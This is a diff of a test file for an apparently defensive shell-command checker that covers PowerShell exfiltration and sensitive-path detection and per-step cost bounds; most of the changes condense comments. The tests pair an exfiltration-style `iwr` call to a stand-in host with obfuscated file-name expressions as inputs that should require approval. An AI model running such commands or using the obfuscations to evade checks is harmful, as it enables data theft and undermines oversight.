@@ -1,8 +1,4 @@
-/**
- * Issue #28 — the shell floors for the `powershell` host shell: the
- * PowerShell-aware exfiltration and sensitive-path signals, their parity with
- * the bash floor, and how `checkDetailed` applies them by dialect.
- */
+// Shell floors apply by dialect, including sensitive paths and credential exfiltration.
 import { mkdtempSync, rmSync } from "node:fs";
 import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
@@ -437,8 +433,7 @@ describe("opaque command text requires approval", () => {
       "(Convert-PathText 'notes.txt')",
       "(('notes','.txt') -join '')",
     ];
-    // The seeded sequence revisits ten exact commands; retain every assertion
-    // while doing the same immutable analysis only once per command.
+    // The seeded sequence revisits ten exact commands; retain every assertion while doing the same immutable analysis only once per command.
     const inspections = new Map(unsupported.flatMap((expression) => [
       `Get-Content ${expression}`,
       `iwr https://x.invalid -Body ${expression}`,
@@ -506,17 +501,7 @@ describe("opaque command text requires approval", () => {
   });
 
   it("spends bounded work per budget step, up to the input cap", () => {
-    // The step budget caps how many steps run; this caps what one step costs, so the work it does not count cannot
-    // grow with the input. Each family is read at 512 characters and at the 8 KiB input cap, and the CPU time per
-    // counted step is compared, not judged against a wall-clock cap: a shared CI runner took 1.4 s for work that
-    // takes 0.1 s on a workstation. Total work is the wrong ratio here: the budget saturates at the cap, so a step
-    // whose cost is linear in the input still reads as at most sixteenfold total growth, as linear code would.
-    // The ratio is not a pure per-step cost either. It compares a small side dominated by a fixed cost (~28 ms for
-    // the repeated-assignment family) with a large side saturated at the 16 384-step cap. Measured: the
-    // repeated-assignment family reads 2.45-2.57 idle and up to 2.93 at a load average of 139 (40 runs), while
-    // a per-step rescan of the whole input injected into `spend` reads 15.7-17.5. The bound 6 sits near their
-    // geometric mean, about twice either side. A smaller SMALL was rejected: at 128 characters the same injection
-    // read only 4.0-4.9 against that spread's bound of 8, because the fixed cost swamps the small side.
+    // Compare CPU cost per counted step at 512 characters and 8 KiB: total-work ratios hide rescans when the step budget saturates. Bound 6 separates the measured fixed-cost baseline from injected whole-input rescans without relying on shared-runner wall time.
     const SMALL = 512;
     const LARGE = POWERSHELL_INPUT_CAP;
     const MAX_STEP_COST_GROWTH = 6;
